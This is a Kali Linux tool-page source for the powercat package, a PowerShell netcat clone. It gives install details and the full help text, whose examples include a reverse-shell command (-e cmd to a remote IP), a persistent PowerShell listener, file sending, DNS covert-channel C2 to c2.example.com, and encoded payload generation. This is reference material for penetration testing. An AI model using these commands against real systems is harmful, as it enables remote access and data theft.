---
Title: powercat
Homepage: https://github.com/besimorhino/powercat
Repository: https://gitlab.com/kalilinux/packages/powercat
Architectures: all
Version: 0.0~git20200727.4bea000-0kali2
Metapackages: kali-linux-everything kali-tools-windows-resources 
Icon: /images/kali-tools-icon-missing.svg
PackagesInfo: |
 ### powercat
 
  This package contains a netcat powershell version. It's a simple utility
  which reads and writes data across network connections using DNS or UDP
  protocol.
 
 **Installed size:** `68 KB`  
 **How to install:** `sudo apt install powercat`  
 
 {{< spoiler "Dependencies:" >}}
 * kali-defaults 
 {{< /spoiler >}}
 
 ##### powercat
 
 
 ```
 root@kali:~# powercat -h
 
 powercat - Netcat, The Powershell Version
 Github Repository: https://github.com/besimorhino/powercat
 
 This script attempts to implement the features of netcat in a powershell
 script. It also contains extra features such as built-in relays, execute
 powershell, and a dnscat2 client.
 
 Usage: powercat [-c or -l] [-p port] [options]
 
   -c  <ip>        Client Mode. Provide the IP of the system you wish to connect to.
                   If you are using -dns, specify the DNS Server to send queries to.
             
   -l              Listen Mode. Start a listener on the port specified by -p.
   
   -p  <port>      Port. The port to connect to, or the port to listen on.
   
   -e  <proc>      Execute. Specify the name of the process to start.
   
   -ep             Execute Powershell. Start a pseudo powershell session. You can
                   declare variables and execute commands, but if you try to enter
                   another shell (nslookup, netsh, cmd, etc.) the shell will hang.
             
   -r  <str>       Relay. Used for relaying network traffic between two nodes.
                   Client Relay Format:   -r <protocol>:<ip addr>:<port>
                   Listener Relay Format: -r <protocol>:<port>
                   DNSCat2 Relay Format:  -r dns:<dns server>:<dns port>:<domain>
             
   -u              UDP Mode. Send traffic over UDP. Because it's UDP, the client
                   must send data before the server can respond.
             
   -dns  <domain>  DNS Mode. Send traffic over the dnscat2 dns covert channel.
                   Specify the dns server to -c, the dns port to -p, and specify the 
                   domain to this option, -dns. This is only a client.
                   Get the server here: https://github.com/iagox86/dnscat2
             
   -dnsft <int>    DNS Failure Threshold. This is how many bad packets the client can
                   recieve before exiting. Set to zero when receiving files, and set high
                   for more stability over the internet.
             
   -t  <int>       Timeout. The number of seconds to wait before giving up on listening or
                   connecting. Default: 60
             
   -i  <input>     Input. Provide data to be sent down the pipe as soon as a connection is
                   established. Used for moving files. You can provide the path to a file,
                   a byte array object, or a string. You can also pipe any of those into
                   powercat, like 'aaaaaa' | powercat -c 10.1.1.1 -p 80
             
   -o  <type>      Output. Specify how powercat should return information to the console.
                   Valid options are 'Bytes', 'String', or 'Host'. Default is 'Host'.
             
   -of <path>      Output File.  Specify the path to a file to write output to.
             
   -d              Disconnect. powercat will disconnect after the connection is established
                   and the input from -i is sent. Used for scanning.
             
   -rep            Repeater. powercat will continually restart after it is disconnected.
                   Used for setting up a persistent server.
                   
   -g              Generate Payload.  Returns a script as a string which will execute the
                   powercat with the options you have specified. -i, -d, and -rep will not
                   be incorporated.
                   
   -ge             Generate Encoded Payload. Does the same as -g, but returns a string which
                   can be executed in this way: powershell -E <encoded string>
 
   -h              Print this help message.
 
 Examples:
 
   Listen on port 8000 and print the output to the console.
       powercat -l -p 8000
   
   Connect to 10.1.1.1 port 443, send a shell, and enable verbosity.
       powercat -c 10.1.1.1 -p 443 -e cmd -v
   
   Connect to the dnscat2 server on c2.example.com, and send dns queries
   to the dns server on 10.1.1.1 port 53.
       powercat -c 10.1.1.1 -p 53 -dns c2.example.com
   
   Send a file to 10.1.1.15 port 8000.
       powercat -c 10.1.1.15 -p 8000 -i C:\inputfile
   
   Write the data sent to the local listener on port 4444 to C:\outfile
       powercat -l -p 4444 -of C:\outfile
   
   Listen on port 8000 and repeatedly server a powershell shell.
       powercat -l -p 8000 -ep -rep
   
   Relay traffic coming in on port 8000 over tcp to port 9000 on 10.1.1.1 over tcp.
       powercat -l -p 8000 -r tcp:10.1.1.1:9000
       
   Relay traffic coming in on port 8000 over tcp to the dnscat2 server on c2.example.com,
   sending queries to 10.1.1.1 port 53.
       powercat -l -p 8000 -r dns:10.1.1.1:53:c2.example.com
 
 ```
 
 - - -
 
---
{{% hidden-comment "<!--Do not edit anything above this line-->" %}}
